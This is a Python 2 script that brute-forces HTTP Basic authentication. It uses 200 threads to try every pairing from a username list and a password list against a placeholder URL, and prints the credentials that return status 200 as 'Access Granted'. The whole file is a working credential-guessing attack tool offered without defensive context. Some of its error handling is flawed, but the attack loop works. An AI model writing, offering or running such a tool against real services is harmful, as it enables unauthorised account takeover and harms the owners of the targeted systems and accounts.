from threading import Thread, Lock
import httplib, sys, urllib2, base64
from Queue import Queue
from sys import platform as _platform
import socket

concurrent = 200
url = "Url"
lock = Lock()


def doWork():
    while True:
        credentials = q.get()
        username = credentials['username'].rstrip() #removing \n
        password = credentials['password'].rstrip() #removing \n
        status, r = getStatus(username, password)
        doSomethingWithResult(status, username, password)
        if r != None :
            r.close()
        q.task_done()
        
def getStatus(username, password):
    while True:
        try:
            request = urllib2.Request(url)
            base64string = base64.encodestring('%s:%s' % (username, password)).replace('\n', '')
            request.add_header("Authorization", "Basic %s" % base64string)   
            r = urllib2.urlopen(request)
            return r.getcode(), r
        except urllib2.URLError as e:
            if hasattr(e, 'code'):
                return e.code, None
            else:
                continue
                return e.reason, None
        except urllib2.HTTPError, e:
            return e.code, r    

def doSomethingWithResult(status, username, password):
    lock.acquire()
    if(status == 200):
        print '\033[92m',status,'Acess Granted with credentials: \033[0m','User:', username, 'Pass:', password
    elif (status == 401):
        print '\033[93m',status,'Acess Denied with credentials: \033[0m','User:', username, 'Pass:', password
    else:
        print '\033[91m',status,'User:', username, 'Pass:', password
    lock.release()

q = Queue(concurrent * 2)
for i in range (concurrent):
    t = Thread(target=doWork)
    t.daemon = True
    t.start()

try:
    for username in open('user_list.txt'):
        for password in open('passwords.txt'):
            data = {'username': username,'password': password}
            q.put(data)
    q.join()
    print "Tested all combinations"
except KeyboardInterrupt:
    sys.exit(1)
